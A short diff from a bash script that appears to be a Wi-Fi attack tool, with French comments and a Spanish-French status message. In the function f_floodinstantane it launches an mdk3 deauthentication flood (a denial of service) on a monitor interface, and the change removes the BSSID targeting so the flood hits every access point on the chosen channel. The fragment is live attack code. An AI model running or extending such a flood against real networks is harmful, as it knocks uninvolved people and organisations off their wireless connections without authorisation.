@@ -388,7 +388,7 @@ fi
 f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
            echo -e "\e[1;34m[*]\e[0m Iniciando el DoS... el canal del AP  va a estar vérificando cada tiempo en segundas que has entrado..."
 sleep 1;
-xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -g -t ${BSSID} -c ${canal} &> /dev/null &
+xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -c ${canal} &> /dev/null &
 echo $! >/tmp/mdk3.pid
 sleep 4;
 while : ; do
